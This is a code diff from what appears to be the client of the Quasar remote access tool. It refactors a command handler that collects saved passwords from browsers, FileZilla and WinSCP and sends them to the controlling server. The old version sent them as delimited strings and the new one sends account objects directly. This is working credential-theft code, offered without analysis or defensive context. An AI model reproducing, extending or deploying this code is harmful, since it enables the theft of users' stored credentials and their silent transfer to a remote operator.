@@ -1,21 +1,21 @@
-﻿using System;
-using System.Drawing;
-using System.IO;
-using System.Windows.Forms;
-using xClient.Core.Helper;
-using System.Drawing.Imaging;
-using System.Threading;
-using xClient.Core.Networking;
-using xClient.Core.Utilities;
-using System.Collections.Generic;
-using Quasar.Common.Enums;
+﻿using Quasar.Common.Enums;
 using Quasar.Common.IO;
 using Quasar.Common.Messages;
+using Quasar.Common.Models;
 using Quasar.Common.Video;
 using Quasar.Common.Video.Codecs;
-using xClient.Core.Data;
+using System;
+using System.Collections.Generic;
+using System.Drawing;
+using System.Drawing.Imaging;
+using System.IO;
+using System.Threading;
+using System.Windows.Forms;
+using xClient.Core.Helper;
+using xClient.Core.Networking;
 using xClient.Core.Recovery.Browsers;
 using xClient.Core.Recovery.FtpClients;
+using xClient.Core.Utilities;
 
 namespace xClient.Core.Commands
 {
@@ -34,15 +34,7 @@ namespace xClient.Core.Commands
             recovered.AddRange(FileZilla.GetSavedPasswords());
             recovered.AddRange(WinSCP.GetSavedPasswords());
 
-            List<string> raw = new List<string>();
-
-            foreach (RecoveredAccount value in recovered)
-            {
-                string rawValue = string.Format("{0}{4}{1}{4}{2}{4}{3}", value.Username, value.Password, value.URL, value.Application, DELIMITER);
-                raw.Add(rawValue);
-            }
-
-            client.Send(new GetPasswordsResponse {Passwords = raw});
+            client.Send(new GetPasswordsResponse {RecoveredAccounts = recovered});
         }
 
         public static void HandleGetDesktop(GetDesktop command, Client client)
